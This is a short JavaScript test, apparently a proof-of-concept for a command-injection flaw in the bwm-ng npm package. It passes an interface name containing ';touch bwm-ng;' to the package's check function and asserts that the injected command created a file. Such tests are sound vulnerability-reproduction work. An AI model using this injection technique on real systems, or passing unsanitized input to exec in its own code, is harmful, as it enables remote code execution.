test("Remote code execution for bwm-ng", (done) => {
  let fs = require('fs');
  const { check } = require('bwm-ng');

  const maliciousFile = './bwm-ng';
  if (fs.existsSync(maliciousFile))
    fs.unlinkSync(maliciousFile);

  var file_exist = fs.existsSync(maliciousFile);
  expect(file_exist).toBe(false);
  check((if_, down, up) => { }, ["enp3s0", "lo", ";touch bwm-ng;"]);

  /* Check performs a horrible async call to exec. So we try to wait for 1s to check for the generated file. */
  setTimeout(function() {
    file_exist = fs.existsSync(maliciousFile);
    expect(file_exist).toBe(true);
    fs.unlink(maliciousFile, (err) => { done(); })
  }, 3000)
});
